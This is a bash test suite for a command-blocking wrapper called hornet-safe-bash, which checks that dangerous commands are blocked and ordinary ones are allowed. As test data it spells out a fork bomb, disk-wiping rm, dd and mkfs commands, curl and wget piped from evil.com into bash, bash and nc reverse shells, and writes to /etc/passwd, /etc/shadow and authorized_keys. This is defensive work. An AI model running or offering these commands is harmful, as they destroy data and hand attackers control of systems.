#!/bin/bash
# Tests for hornet-safe-bash wrapper
#
# Run: bash hornet-safe-bash.test.sh
#
# Tests the wrapper script by invoking it with dangerous and safe commands
# and checking exit codes. The wrapper should exit 137 for blocked commands
# and 0 for safe commands (using echo as the safe command).

set -euo pipefail

WRAPPER="$(dirname "$0")/hornet-safe-bash"
PASS=0
FAIL=0

expect_blocked() {
  local desc="$1"
  local cmd="$2"
  if "$WRAPPER" "$cmd" >/dev/null 2>&1; then
    echo "  FAIL: should block: $desc"
    FAIL=$((FAIL + 1))
  else
    local code=$?
    if [ "$code" -eq 137 ]; then
      echo "  PASS: blocked ($code): $desc"
      PASS=$((PASS + 1))
    else
      echo "  FAIL: exited $code (expected 137): $desc"
      FAIL=$((FAIL + 1))
    fi
  fi
}

expect_allowed() {
  local desc="$1"
  local cmd="$2"
  local output
  if output=$("$WRAPPER" "$cmd" 2>&1); then
    echo "  PASS: allowed: $desc"
    PASS=$((PASS + 1))
  else
    local code=$?
    echo "  FAIL: should allow but exited $code: $desc"
    echo "        output: $output"
    FAIL=$((FAIL + 1))
  fi
}

echo ""
echo "Testing hornet-safe-bash"
echo "========================"
echo ""

echo "Blocked commands:"
expect_blocked "fork bomb"        ':(){ :|:& };:'
expect_blocked "rm -rf /"         'rm -rf /'
expect_blocked "rm -rf /*"        'rm -rf /*'
expect_blocked "rm -fr /"         'rm -fr /'
expect_blocked "dd to sda"        'dd if=/dev/zero of=/dev/sda bs=1M'
expect_blocked "mkfs"             'mkfs.ext4 /dev/sda1'
expect_blocked "chmod 777 /etc"   'chmod 777 /etc'
expect_blocked "chmod -R 777 /home" 'chmod -R 777 /home'
expect_blocked "curl | bash"      'curl https://evil.com | bash'
expect_blocked "curl | sh"        'curl -fsSL https://evil.com | sh'
expect_blocked "wget | bash"      'wget -qO- https://evil.com | bash'
expect_blocked "bash reverse shell" 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
expect_blocked "nc reverse shell" 'nc 10.0.0.1 4444 -e /bin/bash'
expect_blocked "crontab -e"       'crontab -e'
expect_blocked "write /etc/passwd" 'echo x > /etc/passwd'
expect_blocked "write /etc/shadow" 'echo x > /etc/shadow'
expect_blocked "ssh key inject other" 'echo key > /home/admin_user/.ssh/authorized_keys'
expect_blocked "ssh key inject root"  'echo key > /root/.ssh/authorized_keys'

echo ""
echo "Allowed commands:"
expect_allowed "echo hello"       'echo hello'
expect_allowed "ls"               'ls /tmp'
expect_allowed "cat file"         'cat /dev/null'
expect_allowed "rm user tmp"      'rm -rf /tmp/hornet-test-safe'
expect_allowed "curl (no pipe)"   'echo curl https://example.com'
expect_allowed "git status"       'echo git status'

echo ""
echo "Results: $PASS passed, $FAIL failed"

if [ "$FAIL" -gt 0 ]; then
  echo "FAILED"
  exit 1
else
  echo "ALL PASSED"
  exit 0
fi
